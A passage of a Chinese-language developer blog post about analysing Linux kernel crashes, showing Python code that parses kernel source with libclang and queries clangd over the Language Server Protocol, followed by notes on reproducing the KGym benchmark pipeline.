class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        获取函数调用图（示例扩展功能）</span></span><br><span class="line"><span class="string">        目前可用，和ida类似啊</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        call_graph = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> func <span class="keyword">in</span> self.functions:</span><br><span class="line">            caller = func.name</span><br><span class="line">            callees = []</span><br><span class="line">            <span class="comment"># 遍历函数体内的 CALL_EXPR 节点</span></span><br><span class="line">            <span class="keyword">for</span> cursor <span class="keyword">in</span> func.cursor.walk_preorder():</span><br><span class="line">                <span class="keyword">if</span> cursor.kind == CursorKind.CALL_EXPR:</span><br><span class="line">                    callee = cursor.spelling</span><br><span class="line">                    <span class="keyword">if</span> callee:</span><br><span class="line">                        callees.append(callee)</span><br><span class="line">            call_graph[caller] = callees</span><br><span class="line">        <span class="keyword">return</span> call_graph</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 这里Clang需要和电脑上的clang版本相符合</span></span><br><span class="line">    <span class="comment"># 配置 Clang 库路径（根据实际环境调整）</span></span><br><span class="line">    <span class="keyword">from</span> clang.cindex <span class="keyword">import</span> Config</span><br><span class="line">    <span class="comment"># Config.set_library_path(&quot;/usr/local/opt/llvm/lib&quot;)</span></span><br><span class="line">    Config.set_library_file(<span class="string">&quot;/usr/lib/libclang.so&quot;</span>)</span><br><span class="line">    <span class="comment"># 初始化解析器</span></span><br><span class="line">    parser = ClangASTParser(</span><br><span class="line">        file_path=<span class="string">&quot;/home/zjw1nd/MyWorkingFlow/Kernel/kdump/linux-6.13.7/fs/btrfs/accessors.c&quot;</span>,</span><br><span class="line">        kernel_root=<span class="string">&#x27;/home/zjw1nd/MyWorkingFlow/Kernel/kdump/linux-6.13.7/&#x27;</span>,</span><br><span class="line">        arch=<span class="string">&quot;x86&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.analyze()</span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== 结构体 ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> struct <span class="keyword">in</span> parser.structs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;struct.name&#125;</span> (typedef=<span class="subst">&#123;struct.is_typedef&#125;</span>) @ lines <span class="subst">&#123;struct.line_range&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> struct.members:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;member.<span class="built_in">type</span>&#125;</span> <span class="subst">&#123;member.name&#125;</span><span class="subst">&#123;<span class="string">f&#x27; : <span class="subst">&#123;member.bit_width&#125;</span>&#x27;</span> <span class="keyword">if</span> member.bit_width <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 函数 ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> parser.functions:</span><br><span class="line">        params = <span class="string">&#x27;, &#x27;</span>.join([<span class="string">f&quot;<span class="subst">&#123;t&#125;</span> <span class="subst">&#123;n&#125;</span>&quot;</span> <span class="keyword">for</span> n, t <span class="keyword">in</span> func.parameters])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;func.return_type&#125;</span> <span class="subst">&#123;func.name&#125;</span>(<span class="subst">&#123;params&#125;</span>) @ lines <span class="subst">&#123;func.line_range&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 宏 ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> macro <span class="keyword">in</span> parser.macros:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;#define <span class="subst">&#123;macro.name&#125;</span> <span class="subst">&#123;macro.value&#125;</span> @ line <span class="subst">&#123;macro.line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> funct <span class="keyword">in</span> parser.get_call_graph():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Function <span class="subst">&#123;funct&#125;</span> calls: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(parser.get_call_graph()[funct])&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个脚本的工作是如此良好以至于我以为事情似乎解决了。</p><h2 id="难以解决的问题？">难以解决的问题？</h2><p>linux内核是一个有着复杂的关联关系的大项目，只实现一个文件的查找显然是不够的，现在的核心问题就变成了<strong>如何多文件/跨文件进行查询</strong>。崩溃现场的堆栈提供的源代码位置只是返回地址的位置，其实对于<em>定义</em>的支持并不好。如果定义在其他文件中呢？</p><p>自然而然地浮现出两种思路，一是将所有的源码，不管用什么办法，集合成一个同一的查询实体，在其中进行查找。但是对于AST来说，clang的python库对于多个文件构建项目ast的支持没有那么好，而且linux内核源码太大了。二是想办法查找某种关联关系，接着对单独的文件逐个调用我们上面的脚本。但是这同样需要linux内核各个文件的依赖关系。</p><h2 id="启发思路">启发思路</h2><p>我当然是不相信这种工作没有前人做的，于是尝试搜索相关的开源项目。开源的没有找到，询问AI他告诉我可以参考“微软的scip”，我尝试搜索这个scip，却顺藤摸瓜找到了一个商业软件<a href="https://sourcegraph.com/">sourcegraph</a>，是专门用来浏览源代码的。他在github上开源了一个插件叫<a href="https://github.com/sourcegraph/scip-clang">scip-clang</a>，即用clang依据compile_commands.json生成整个项目的索引文件用来快速浏览。</p><blockquote><p>compile_commands.json就是用json文件记录所有编译过程中的命令。这个文件也被称为“编译数据库”。在比较新的linux内核中，已经可以直接通过为make命令添加compile_commands.json命令来生成这个文件了。对于更糟的版本，许就要借助bear工具进行编译。</p></blockquote><p>这个东西是我之前不知道的。这个插件虽然开源，但它生成的索引文件是一个二进制文件，软件本身是商业软件所以很可惜不能用。但是这给我们提供了一个方向，我们是否可以在这个编译数据库文件上做文章？</p><h1>♿资料收集中的灵光一闪–Language Server</h1><p>既然有成熟的商业化方案，我试图从sourcegraph这个软件开源的部分或者各种介绍中找到一些灵感。胡乱用关键词搜索的时候，我看到了一个用VSCode+clangd浏览linux内核源码的<a href="https://www.cnblogs.com/yann-qu/p/17956726">帖子</a>。了解了一下，发现clangd是一个叫作“语言服务器”的东西。这个东西就是在IDE中提供那些快捷跳转的核心引擎。我自己复现了一下，用compile_commands.json和clangd去浏览linux内核源码，发现的确很好用，等待clangd构建好索引之后我在代码中可以随便跳转函数和结构的定义。<strong>这不就是我们想要的功能吗？</strong></p><p>于是就有了现在的思路，查找了下python和clangd怎么通信，发现微软为语言服务器实现了一套协议标准：LSP(Language Server Protocol)，这是一套json格式的通信协议。并且linux下的语言服务器可以单独运行，而且其输入输出是直接通过stdin和stdout进行交互的。那下一步当然就是查找python的lsp通信协议库，不过这里没有找到很好的，只有一个简易的<a href="https://github.com/yeger00/pylspclient">lsp客户端</a>，而且还没有任何接口文档和example。</p><p>让AI读了下这个库并且大致编写了一些测试，发现果然好用。用这个语言服务器（其实是我们在模拟一个IDE浏览linux内核源码），我们可以省略掉所有的查找细节，底层的工作全交给clangd处理，查询全透明，我们只需要学习LSP协议的大致格式就可以了–甚至只要有合适的封装我们甚至不需要熟悉LSP协议。也是找到轮椅了。下面是第一版的测例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pylspclient.lsp_endpoint <span class="keyword">import</span> LspEndpoint</span><br><span class="line"><span class="keyword">from</span> pylspclient.json_rpc_endpoint <span class="keyword">import</span> JsonRpcEndpoint</span><br><span class="line"><span class="keyword">from</span> pylspclient.lsp_client <span class="keyword">import</span> LspClient</span><br><span class="line"><span class="keyword">from</span> pylspclient.lsp_pydantic_strcuts <span class="keyword">import</span> (</span><br><span class="line">    TextDocumentItem, TextDocumentIdentifier, Position,</span><br><span class="line">    Location, DocumentSymbol</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 启动 clangd 进程</span></span><br><span class="line">    server_process = subprocess.Popen(</span><br><span class="line">        [<span class="string">&quot;clangd&quot;</span>, <span class="string">&quot;--log=verbose&quot;</span>],</span><br><span class="line">        stdin=subprocess.PIPE,</span><br><span class="line">        stdout=subprocess.PIPE,</span><br><span class="line">        stderr=subprocess.PIPE</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 JsonRpcEndpoint 包装标准输入/输出流</span></span><br><span class="line">    json_rpc_endpoint = JsonRpcEndpoint(server_process.stdin, server_process.stdout)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 json_rpc_endpoint 创建 LSP 端点</span></span><br><span class="line">    lsp_endpoint = LspEndpoint(json_rpc_endpoint)</span><br><span class="line">    lsp_client = LspClient(lsp_endpoint)</span><br><span class="line">    </span><br><span class="line">    capabilities = &#123;</span><br><span class="line">        <span class="string">&quot;textDocument&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;synchronization&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;willSave&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;willSaveWaitUntil&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;didSave&quot;</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;completion&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;completionItem&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;snippetSupport&quot;</span>: <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;definition&quot;</span>: &#123;<span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">            <span class="string">&quot;references&quot;</span>: &#123;<span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">            <span class="string">&quot;documentSymbol&quot;</span>: &#123;<span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    root_path = os.getcwd()</span><br><span class="line">    root_uri = <span class="string">f&quot;file://<span class="subst">&#123;root_path&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送初始化请求</span></span><br><span class="line">    init_result = lsp_client.initialize(</span><br><span class="line">        processId=os.getpid(),</span><br><span class="line">        rootPath=root_path,</span><br><span class="line">        rootUri=root_uri,</span><br><span class="line">        initializationOptions=<span class="literal">None</span>,</span><br><span class="line">        capabilities=capabilities,</span><br><span class="line">        trace=<span class="string">&quot;verbose&quot;</span>,</span><br><span class="line">        workspaceFolders=<span class="literal">None</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器能力:&quot;</span>, init_result.get(<span class="string">&quot;capabilities&quot;</span>, &#123;&#125;))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 告诉服务器我们已经准备好</span></span><br><span class="line">    lsp_client.initialized()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建一个简单的 C 代码文件进行分析</span></span><br><span class="line">    c_file_path = os.path.join(root_path, <span class="string">&quot;example.c&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(c_file_path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct Point &#123;</span></span><br><span class="line"><span class="string">    int x;</span></span><br><span class="line"><span class="string">    int y;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int add(int a, int b) &#123;</span></span><br><span class="line"><span class="string">    return a + b;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">    struct Point p = &#123;10, 20&#125;;</span></span><br><span class="line"><span class="string">    int result = add(p.x, p.y);</span></span><br><span class="line"><span class="string">    printf(&quot;Result: %d\\n&quot;, result);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通知服务器文件已打开</span></span><br><span class="line">    uri = <span class="string">f&quot;file://<span class="subst">&#123;c_file_path&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(c_file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    text_document = TextDocumentItem(</span><br><span class="line">        uri=uri,</span><br><span class="line">        languageId=<span class="string">&quot;c&quot;</span>,</span><br><span class="line">        version=<span class="number">1</span>,</span><br><span class="line">        text=content</span><br><span class="line">    )</span><br><span class="line">    lsp_client.didOpen(text_document)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待服务器处理文件</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取文档中的符号</span></span><br><span class="line">    document_id = TextDocumentIdentifier(uri=uri)</span><br><span class="line">    symbols = lsp_client.documentSymbol(document_id)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n文档符号:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> symbol <span class="keyword">in</span> symbols:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;symbol.name&#125;</span> (<span class="subst">&#123;symbol.kind&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查找 add 函数的定义</span></span><br><span class="line">    position = Position(line=<span class="number">13</span>, character=<span class="number">12</span>)  <span class="comment"># main 函数中调用 add 的位置</span></span><br><span class="line">    definitions = lsp_client.definition(document_id, position)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n定义:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(definitions, <span class="built_in">list</span>):</span><br><span class="line">        <span class="keyword">for</span> definition <span class="keyword">in</span> definitions:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(definition, <span class="string">&quot;targetUri&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  位于 <span class="subst">&#123;definition.targetUri&#125;</span> 的行 <span class="subst">&#123;definition.targetRange.start.line&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  位于 <span class="subst">&#123;definition.uri&#125;</span> 的行 <span class="subst">&#123;definition.<span class="built_in">range</span>.start.line&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  位于 <span class="subst">&#123;definitions.uri&#125;</span> 的行 <span class="subst">&#123;definitions.<span class="built_in">range</span>.start.line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭服务器</span></span><br><span class="line">    lsp_client.shutdown()</span><br><span class="line">    lsp_client.exit()</span><br><span class="line">    server_process.terminate()</span><br><span class="line">    server_process.wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="测试实现">测试实现</h2><p>这个过程就是一个不断让AI读pylspclient然后调优-阅读<a href="https://microsoft.github.io/language-server-protocol/specifications/lsp/3.17">文档</a>和读代码解决问题-再重新调整代码的一个循环。</p><p>这个轻量级的pylspclient库有很多问题。不过好处是我们可以直接import它私有的部分来自己实现东西。</p><h2 id="问题和解决">问题和解决</h2><p>对于遇到的问题，一个很好的对比排错方法是开启<code>-log=verbose</code>之后，监控stderr的输出和vscode的输出对比，来观察和clangd通信的过程。毕竟组件都是一样的，vscode能做到的我们也能做到。</p><h3 id="索引等待">索引等待</h3><p>clangd能快速跳转定义的一个依赖就是其索引。但是索引的构建需要时间。vscode中实现的进度条是通过<code>$/progress</code>方法实现的。但是自己做的时候不清楚怎么填token（之前没有意识到观察vscode调试的方法）。</p><p>最后选择的是通过监控stderr记录日志中<code>Indexed</code>关键字数量，和compile_commands.json的条目数量匹配来实现的进度统计。</p><blockquote><p>这里后续可以接着尝试$/progress方法</p></blockquote><h3 id="方法的转换">方法的转换</h3><p>开始ai给的查找符号的核心方法是<code>workspace/symbol</code>，但是我发现这个方法有问题。最开始，触发索引是需要打开文件的，我们打开一些关键的文件来实现这一点，这些文件正好包含了我们的测试符号的定义，因此误打误撞以为对了，结果一测别的函数就查不到了。阅读<a href="https://microsoft.github.io/language-server-protocol/specifications/lsp/3.17/specification/#workspace_symbol">文档</a>，这个方法只能在打开的工作区中去做符号匹配（不区分函数，宏…），如果要用这个方法，那就意味着需要打开所有的linux内核文件，这显然不现实。改来改去也没有用，本质上是调用的方法错了。</p><p>从这里开始我意识到可以观察vscode的日志来对比了，我发现vscode查找定义使用的就是<code>textDocument</code>下面的方法，查定义用<code>definition</code>，查引用用<code>references</code>，而且返回的结果特别理想。于是我推翻了<code>workspace/symbol</code>方法，改用了<code>textDocument/definition</code>。</p><h3 id="小问题">小问题</h3><p>clangd会发送notify给客户端，我们需要注册相应的回调函数，否则<code>lsp_endpoint.call_method</code>会报错，我们注册一个函数处理<code>publishDiagnostics</code>，直接pass掉就行。</p><p>另外，获取符号中间想也用LSP方法的，但是用了下<code>textdocument/documentSymbols</code>之后发现它只返回当前文档中定义了的符号就又重新换回字符串查找了。</p><h3 id="最怪异的问题">最怪异的问题</h3><p>最后一切执行妥当，但是查找定义和引用都遇到了以下现象：只能返回本文件及其头文件中的声明，无法返回外部的定义。</p><p>dump日志和vscode对比发现，方法调用和初始化参数没有区别，我尝试了很多办法但是还是查不到定义。但是vscode的返回就是很好。</p><p>这里不得不说多人组队开发的好处了。开会的时候我说了这个怪异的问题并且提供了日志对比，另一个负责这部分的队友试了下，发现他那边的程序在调用一次<code>textDocument/documentLinks</code>之后就可以查到定义了。结果我本地用它的程序仍然不行，我们对了一下全流程，我从头下载了一个源码，然后使用<code>bear -- make $(nproc) LLVM=1</code>来编译，用bear生成编译数据库而不用linux内核自带的compile_commands.json，并且用<code>LLVM=1</code>而非<code>CC=clang</code>来编译，结果令人惊奇，这一套下来就正常了。经过后续的测试，打开文件后的第一个命令（查找定义）一定是错的，在一个其他操作后再查询定义就会正常。</p><p>然而我重新编译了一边之前用的linux内核源码，结果查还是查不到，居然有了更离谱的返回值：直接不演了返回我查询的原位置。这让我感觉这东西肯定和编译过程有关，目前的解决方法是：</p><ul class="lvl-0"><li class="lvl-2"><p>下载源码后使用<code>bear -- make $(nproc) LLVM=1</code>编译，用bear数据库不要用linux内核的</p></li></ul><blockquote><p>但是，对于我旧版的编译数据库，vscode也能正常运行并无大碍，原因不明，太诡异了，只能说能有一个稳定跑的方案就不要动了</p></blockquote><p>如果我自己研究可能相当长时间也解决不了（直到我试错试到更换编译数据库才会发现）.</p><hr><p>但是这个解决方法显然是不合理的，非常的程序员刻板印象笑话：tmd凭什么能跑？这些操作下来，就如同你要询问一个人一个问题的答案，他也没有不理你，只是一直坚定地回答同一个错误的答案。直到你下次提前拍了他两下然后扇自己一巴掌，你就得到了争取答案，而且这套流程总能得到正确答案，但是就是很怪异。</p><p>最终在51假期最后一天我经过各种尝试和ai调教，试出来了关键问题所在：延迟。虽然我仍然不知道的是，<strong>为什么tmd clangd会返回错误答案</strong>，但是经过测试，关键点不在删的那一巴掌，你其实只要等一下就好：在打开文件后添加一个<code>time.sleep(0.5)</code>一切就都解决了，定义非常完好。我也不清楚clangd到底怎么做的机制，不阻塞或是提示没找到，反而对于我们调用definition方法的时候返回一个declaration？？？</p><p>ok，通过在交互前添加延迟，引用和定义全拿下了。</p><h3 id="添加-progress">添加$progress</h3><p>对比vscode的日志来调方法，结果发现原来<code>window/workDoneProgress/create</code>是一个服务端给客户端的通知而不是请求。添加了俩功能，调了下生命周期的问题（回调函数需要只有一个param参数，但是类示例初始化就要注册这个函数），analyzer改成全局的，暂时性的问题解决了。</p><h3 id="符号搜索">符号搜索</h3><p>测试panic函数的时候发现会匹配到注释中的panic导致搜不到符号。</p><h2 id="最终代码">最终代码</h2><h1>KGym</h1><h2 id="环境搭建（折磨）">环境搭建（折磨）</h2><h3 id="google-cloud">google cloud</h3><p>创建实例的命令需要做调整</p><h2 id="原始论文的调用流程">原始论文的调用流程</h2><p>我们的目标是把我们的agent替换进原始论文的LLM部分让它生成root cause（先）。这里根据github上的仓库来看，它有三个仓库。分别是</p><p>根据readme，一套完整的客户端的复现流程大概是这样执行的：</p><ol><li class="lvl-3"><p><code>KGym-Kernel-Playground/populate_benchmark.py</code>。程序从ben这一程序从syzbot网站下载崩溃所需要的内核配置文件，syzreproducer和Creproducer等。</p><ul class="lvl-2"><li class="lvl-5">读取JSON格式的bug数据</li><li class="lvl-5">处理每个bug中的崩溃记录（crashes）</li><li class="lvl-5">下载相关的重现代码和内核配置</li><li class="lvl-5">将下载的数据添加到原始JSON中</li><li class="lvl-5">保存更新后的JSON</li></ul></li><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/make_datasets/make_linux_dataset.py</code>。紧接着步骤1，进一步生成合适的dataset json文件，包含崩溃报告，内核补丁，提交信息，修改文件等等，存放在<code>$KBENCH_EXPR_PATH/dataset</code>目录下</p></li><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/make_datasets/bm25_retrieval_modified.py</code>。使用bm25索引算法，将代码文件转成可搜索文档（构建全文索引）利用2生成的dataset, 用了一个叫pyserini的库来对特定的commit linux代码仓库做检索。每个问题返回最相关的20个文件并输出。</p></li></ol><blockquote><p>这里我们是否可以直接通过clangd搜索符号引用的方式来确定相关文件？源文档readme中说要大概3h</p></blockquote><ol start="4"><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/make_datasets/create_text_dataset.py</code>. 这个程序生成最终发给大模型的内容。它应用了一些prompt模板，从3中生成的检索结果生成结构化的自然语言内容。</p></li><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/run_api.py</code>. 这个程序将4生成的内容发给大模型并获取patch保存在文件。对不同模型做了兼容。</p></li><li class="lvl-3"><p><code>$BASE_PATH/run_prompt_predictions.py</code>。这里开始就是运行KGym去做复现了。这个程序用于生成合适的参数并运行<code>KReproducer.execute_bug_reproduction</code>在KGym平台做复现。</p></li><li class="lvl-3"><p><code>$BASE_PATH/perform_sample_build_and_reproduction.py</code> 跟踪任务状态。这个程序对每一个最初kGym架构图中的实例都做了一个类。</p></li><li class="lvl-3"><p><code>kernel_bench_evaluator.py</code> 从任务报告中读取执行结果并且跟踪重复测试，连续成功3次，最大尝试次数5.</p></li></ol><h2 id="平台测试：">平台测试：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">export $KEBCH_EXPR_PATH=&quot;&quot;</span><br><span class="line">python $KBENCH_EXPR_PATH/inference/make_datasets/create_text_dataset.py \</span><br><span class="line">--dataset_name_or_path=&quot;$KBENCH_EXPR_PATH/dataset/kernel_bench_data.json&quot; \</span><br><span class="line">--splits=&quot;train&quot; \</span><br><span class="line">--output_dir=&quot;$KBENCH_EXPR_PATH/dataset_results/parent_commit&quot; \</span><br><span class="line">--retrieval_file=&quot;$KBENCH_EXPR_PATH/index_results/parent_commit/kernel_bench_data/file_name_and_contents.retrieval.jsonl&quot; \</span><br><span class="line">--read_linux_from=&quot;$KBENCH_EXPR_PATH/index_results/parent_commit/kernel_bench_data/file_name_and_contents_indexes&quot; \</span><br><span class="line">--file_source=&quot;oracle&quot; \</span><br><span class="line">--max_context_len=16000 \</span><br><span class="line">--tokenizer_name=&quot;cl100k&quot; \</span><br><span class="line">--problem_statement_max_tokens=10000 \</span><br><span class="line">--commit_type=&quot;parent_commit&quot;</span><br></pre></td></tr></table></figure><h2 id="我们的">我们的</h2><h3 id="cur">cur</h3><p>进一步添加vmcore信息提取工具，给出了寄存器信息。不过要考虑上下文压缩？不要太多没用的信息</p><p>gdb mi命令？推翻重构，直接用MI命令实现</p><p>kgym获取源代码信息靠的是崩溃dmesg在内核代码库中用bm25做全局相关度检索，我们用lsp直接可以拉出来函数引用，我们直接用代码本身的语义相关</p><p>封装工具</p><p>他是要拿到一个syzbot崩溃报告的具体复现环境然后给MCP服务器。思路上是从syzbot网站拿到相关的内容-&gt;自动化构建-&gt;qemu运行内核+poc连接gdb，同时提供源码搜索</p><p>我们如果vmcore分析完全不需要那么多环境？我们不关心vmcore是哪来的，有一个vmcore现场</p><p>更现代的包管理器-uv</p><p>提供的项目是怎么做的？我们能不能快速地模仿？</p><h2 id="1-提供的项目怎么做的？">1. 提供的项目怎么做的？</h2><p>忽略ida-pro-mcp的部分后端逻辑大概懂了，改一下可以用。</p><p>自动化提取vmcore？？先跑</p><p>想办法搞一个开箱即用的环境，</p><p>zjl</p><ul class="lvl-0"><li class="lvl-2"><p>（尽可能）开箱即用的vmcore提取环境</p></li><li 